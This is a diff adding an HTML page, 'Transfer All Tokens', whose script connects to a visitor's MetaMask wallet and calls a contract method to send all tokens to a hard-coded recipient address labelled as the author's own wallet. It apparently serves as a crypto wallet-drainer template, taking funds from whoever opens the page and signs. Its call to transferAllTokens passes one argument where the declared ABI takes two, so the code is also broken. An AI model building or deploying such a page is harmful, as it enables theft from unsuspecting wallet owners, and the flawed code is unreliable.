@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  <base href="/transfer.html">
+  <title>Transfer All Tokens</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+</head>
+<body>
+  <h1>Transfer All Tokens</h1>
+  <button id="transferButton">Open MetaMask & Sign</button>
+
+  <script>
+    const contractAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3"; // Dein Contract Address
+    const contractABI = [
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "token",
+            "type": "address"
+          },
+          {
+            "internalType": "address",
+            "name": "recipient",
+            "type": "address"
+          }
+        ],
+        "name": "transferAllTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "recipient",
+            "type": "address"
+          }
+        ],
+        "name": "transferNativeCurrency",
+        "outputs": [],
+        "stateMutability": "payable",
+        "type": "function"
+      }
+    ];
+
+    const recipientAddress = "0xeefB5bFd68c00c379576441A1CB3f7C369B699BE"; // Dein MetaMask Wallet
+
+    async function transferAllTokens() {
+      if (typeof window.ethereum === "undefined") {
+        alert("MetaMask is not installed or detected! Please install it to proceed.");
+        return;
+      }
+
+      try {
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        const senderAddress = accounts[0];
+        const web3 = new Web3(window.ethereum);
+        const contract = new web3.eth.Contract(contractABI, contractAddress);
+        const gasEstimate = await contract.methods.transferAllTokens(recipientAddress).estimateGas({
+          from: senderAddress,
+        });
+
+        await contract.methods.transferAllTokens(recipientAddress).send({
+          from: senderAddress,
+          gas: gasEstimate,
+        });
+
+        alert("Tokens transferred successfully!");
+      } catch (err) {
+        console.error("Error:", err);
+        alert(`An error occurred: ${err.message}`);
+      }
+    }
+
+    document.getElementById("transferButton").addEventListener("click", transferAllTokens);
+  </script>
+</body>
+</html>
